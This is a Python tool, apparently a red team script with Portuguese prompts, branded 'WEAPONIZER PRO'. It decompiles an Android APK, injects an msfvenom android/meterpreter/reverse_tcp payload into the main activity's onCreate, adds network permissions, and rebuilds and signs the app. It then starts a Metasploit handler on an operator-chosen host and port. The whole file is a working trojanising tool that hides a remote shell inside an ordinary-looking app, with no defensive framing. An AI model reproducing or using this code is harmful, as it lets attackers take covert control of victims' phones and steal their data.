#!/usr/bin/env python3
import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- PALETA DE CORES PROFISSIONAL ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Professional Red Team Engine (V6.5 HOTFIX){RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def fix_yaml_bug(folder):
    """Corrige o erro 'Global tag is not allowed' no apktool.yml."""
    yaml_path = os.path.join(folder, "apktool.yml")
    if os.path.exists(yaml_path):
        log("Corrigindo bugs de YAML no arquivo de metadados...", "info")
        with open(yaml_path, "r") as f:
            lines = f.readlines()
        
        # Remove a linha !!brut.androlib.meta.MetaInfo que causa o erro
        with open(yaml_path, "w") as f:
            for line in lines:
                if "!!brut.androlib.meta.MetaInfo" not in line:
                    f.write(line)
        return True
    return False

def build_e_assinar(out):
    print(f"\n {YELLOW}»{RESET} Nome desejado para o APK final:")
    name = input(f" {RED}# {RESET}").strip()
    if not name: name = f"{out}_weaponized"
    if not name.endswith(".apk"): name += ".apk"
    
    final_path = os.path.abspath(name)
    
    # --- HOTFIX PARA O ERRO DE YAML ---
    fix_yaml_bug(out)
    
    log(f"Construindo APK: {BOLD}{name}{RESET}...", "info")
    
    # Build
    res_b = subprocess.run(["apktool", "b", out, "-o", "tmp_build.apk"], capture_output=True, text=True)
    if not os.path.exists("tmp_build.apk"):
        log("Erro na recompilação! Tentando modo alternativo...", "warn")
        # Segunda tentativa forçando o apktool a ignorar erros de framework
        subprocess.run(["apktool", "b", out, "-o", "tmp_build.apk", "--use-aapt2"], capture_output=True)
        
        if not os.path.exists("tmp_build.apk"):
            log("Erro crítico persistente.", "error")
            print(f"{RED}--- LOG TÉCNICO ---{RESET}\n{res_b.stderr}")
            input(f"\n{YELLOW}Pressione Enter para voltar ao menu...{RESET}")
            return False

    # Sign
    if not os.path.exists("weaponizer.keystore"):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "weaponizer.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    log("Assinando artefato final...", "info")
    subprocess.run(["apksigner", "sign", "--ks", "weaponizer.keystore", "--ks-pass", "pass:android", "--out", final_path, "tmp_build.apk"], capture_output=True)
    
    if os.path.exists("tmp_build.apk"): os.remove("tmp_build.apk")
    
    if os.path.exists(final_path):
        print(f"\n{GREEN}[+++] WEAPONIZATION CONCLUÍDA!{RESET}")
        print(f" {WHITE}Arquivo salvo em:{RESET} {BOLD}{final_path}{RESET}")
        input(f"\n{YELLOW}Pressione Enter para continuar...{RESET}")
        return True
    return False

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} LHOST (IP/DNS): ").strip()
    lport = input(f" {YELLOW}»{RESET} LPORT: ").strip()
    if not lhost or not lport: return False, None, None

    log("Gerando Payload e injetando Hook...", "info")
    p_apk = "payload_temp.apk"
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", p_apk], capture_output=True)
    subprocess.run(["apktool", "d", p_apk, "-o", "p_tmp", "-f"], capture_output=True)
    
    # Migração das classes
    src = os.path.join("p_tmp", "smali", "com", "metasploit")
    dst = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst): rmtree(dst)
    copytree(src, dst)

    # Lógica de MainActivity e Hook
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m = f.read()
        main_act = re.search(r'<activity [^>]*android:name="([^"]+)"', m).group(1)
        if main_act.startswith('.'):
            pkg = re.search(r'package="([^"]+)"', m).group(1)
            main_act = pkg + main_act

    rel_path = main_act.replace('.', '/') + ".smali"
    smali_path = None
    for i in range(1, 20):
        f_name = "smali" if i == 1 else f"smali_classes{i}"
        test_path = os.path.join(project_folder, f_name, rel_path)
        if os.path.exists(test_path):
            smali_path = test_path; break

    if smali_path:
        with open(smali_path, "r") as f: lines = f.readlines()
        new_lines, injected, in_oncreate = [], False, False
        for line in lines:
            new_lines.append(line)
            if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
            if in_oncreate and "invoke-super" in line and not injected:
                new_lines.append("\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
            if ".end method" in line: in_oncreate = False
        with open(smali_path, "w") as f: f.writelines(new_lines)

    # Injeta Permissões
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f: manifest = f.read()
    for p in ['INTERNET', 'ACCESS_NETWORK_STATE', 'WAKE_LOCK']:
        if p not in manifest:
            manifest = manifest.replace("</manifest>", f'    <uses-permission android:name="android.permission.{p}"/>\n</manifest>')
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "w") as f: f.write(manifest)

    rmtree("p_tmp"); os.remove(p_apk)
    return True, lhost, lport

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile APK\n [{RED}2{RESET}] GERAR SHELL + BUILD + SIGN\n [{RED}3{RESET}] ls\n [{RED}4{RESET}] Sair")
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@terminal:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            subprocess.run(["ls", "-F", "--color=auto"]); input("\nEnter...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} APK Alvo: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Projeto pronto na pasta: {out}", "success"); time.sleep(2)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Nome da Pasta do Projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, port = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        if input(f"\n{YELLOW}[?]{RESET} Iniciar Handler? (s/n): ").lower() == 's':
                            os.system(f"msfconsole -q -x 'use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit'")
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
